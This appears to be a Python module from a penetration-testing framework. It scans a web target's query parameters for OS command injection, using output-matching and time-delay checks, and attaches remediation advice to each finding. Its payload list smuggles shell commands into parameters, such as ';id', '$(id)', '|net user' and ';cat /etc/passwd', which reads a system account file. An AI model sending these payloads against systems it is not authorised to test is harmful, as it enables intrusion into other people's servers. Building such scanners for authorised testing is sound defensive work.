import re
import time
from typing import List, Optional
from urllib.parse import urlparse, parse_qs

import requests

from core.base_module import BaseModule, ScanResult, Finding

CMDI_PARAMS = [
    "cmd", "exec", "command", "execute", "ping", "query", "jump",
    "code", "reg", "do", "func", "arg", "option", "load", "process",
    "step", "read", "feature", "exe", "module", "payload", "run",
    "daemon", "upload", "dir", "ip", "host", "target", "to", "from",
    "search", "q", "input", "test", "id", "name", "user",
]

# (payload, expected_output_pattern, technique)
DETECTION_PAYLOADS = [
    # Output-based — Unix
    (";id",               r"uid=\d+.*gid=\d+",    "unix-output"),
    ("&&id",              r"uid=\d+.*gid=\d+",    "unix-output"),
    ("|id",               r"uid=\d+.*gid=\d+",    "unix-output"),
    ("`id`",              r"uid=\d+.*gid=\d+",    "unix-output"),
    ("$(id)",             r"uid=\d+.*gid=\d+",    "unix-output"),
    (";whoami",           r"root|www-data|apache|nginx|nobody", "unix-output"),
    ("&&whoami",          r"root|www-data|apache|nginx|nobody", "unix-output"),
    ("|whoami",           r"root|www-data|apache|nginx|nobody", "unix-output"),
    (";cat /etc/passwd",  r"root:.*:0:0:",         "unix-file-read"),
    ("&&cat /etc/passwd", r"root:.*:0:0:",         "unix-file-read"),
    # Output-based — Windows
    ("|whoami",           r"nt authority|system|administrator", "win-output"),
    ("&whoami",           r"nt authority|system|administrator", "win-output"),
    (";dir",              r"Directory of|Volume in drive",      "win-output"),
    ("&&dir C:\\",        r"Directory of|Volume in drive",      "win-output"),
    ("|net user",         r"User accounts for",                 "win-output"),
    # Blind time-based — Unix
    (";sleep 5",          None, "unix-time"),
    ("&&sleep 5",         None, "unix-time"),
    ("|sleep 5",          None, "unix-time"),
    ("$(sleep 5)",        None, "unix-time"),
    # Blind time-based — Windows
    ("&ping -n 5 127.0.0.1", None, "win-time"),
    ("|ping -n 5 127.0.0.1", None, "win-time"),
]

TIME_THRESHOLD = 4.0  # seconds above baseline to confirm time-based


class Module(BaseModule):
    name = "cmdi"
    description = "Command injection scanner — output-based and time-based blind detection"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"Command injection scan on [bold]{url}[/]")

        existing_params = self._extract_params(url)
        base_url = url.split("?")[0] if existing_params else url
        params_to_test = list(set(existing_params) | set(CMDI_PARAMS))

        self.log.info(f"  Testing {len(params_to_test)} params")

        for param in params_to_test:
            # Baseline timing
            baseline = self._baseline(session, base_url, param, timeout)

            # Output-based
            finding = self._test_output_based(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)
                continue

            # Time-based blind
            finding = self._test_time_based(session, base_url, param, timeout, baseline)
            if finding:
                result.add_finding(finding)

        if not result.findings:
            self.log.info("[dim]No command injection detected[/]")

        return result

    def _baseline(self, session, base_url, param, timeout) -> float:
        try:
            resp = session.get(base_url, params={param: "1"}, timeout=timeout, verify=False)
            return resp.elapsed.total_seconds()
        except Exception:
            return 1.0

    def _test_output_based(self, session, base_url, param, timeout) -> Optional[Finding]:
        for payload, pattern, technique in DETECTION_PAYLOADS:
            if pattern is None:
                continue
            try:
                resp = session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True,
                )
                if re.search(pattern, resp.text, re.IGNORECASE):
                    match = re.search(pattern, resp.text, re.IGNORECASE)
                    self.log.info(
                        f"  [bold red]CMDI CONFIRMED[/] (output-based/{technique}) "
                        f"param={param} payload={payload!r}"
                    )
                    return Finding(
                        title=f"Command Injection (Output-Based) — parameter: {param}",
                        severity="critical",
                        description=(
                            f"OS command injection confirmed in parameter '{param}'. "
                            f"The server executed the injected command and returned its output. "
                            f"Technique: {technique}."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Pattern matched: {pattern}\n"
                            f"Output snippet: {match.group(0) if match else ''}"
                        ),
                        remediation=(
                            "Never pass user input to shell commands. "
                            "Use language-native APIs instead of shell execution. "
                            "If shell use is unavoidable, use strict allowlists and escape all input. "
                            "Run the application as a low-privilege user."
                        ),
                        tags=["cmdi", "rce", "critical", "web"],
                    )
            except requests.RequestException:
                continue
        return None

    def _test_time_based(self, session, base_url, param, timeout, baseline: float) -> Optional[Finding]:
        for payload, pattern, technique in DETECTION_PAYLOADS:
            if pattern is not None:
                continue
            if "time" not in technique:
                continue
            try:
                start = time.time()
                session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout + 8,
                    verify=False,
                )
                elapsed = time.time() - start

                if elapsed >= (baseline + TIME_THRESHOLD):
                    self.log.info(
                        f"  [bold red]CMDI CONFIRMED[/] (time-based/{technique}) "
                        f"param={param} payload={payload!r} delay={elapsed:.1f}s"
                    )
                    return Finding(
                        title=f"Command Injection (Time-Based Blind) — parameter: {param}",
                        severity="critical",
                        description=(
                            f"Blind OS command injection confirmed in parameter '{param}' via time delay. "
                            f"The server executed '{payload}', causing a {elapsed:.1f}s delay "
                            f"(baseline: {baseline:.1f}s). Technique: {technique}."
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Baseline: {baseline:.2f}s\n"
                            f"Injected response time: {elapsed:.2f}s\n"
                            f"Delta: +{elapsed - baseline:.2f}s"
                        ),
                        remediation=(
                            "Never pass user input to shell commands. "
                            "Use language-native APIs instead of shell execution. "
                            "If shell use is unavoidable, use strict allowlists and escape all input."
                        ),
                        tags=["cmdi", "rce", "blind", "time-based", "web"],
                    )
            except requests.RequestException:
                continue
        return None

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
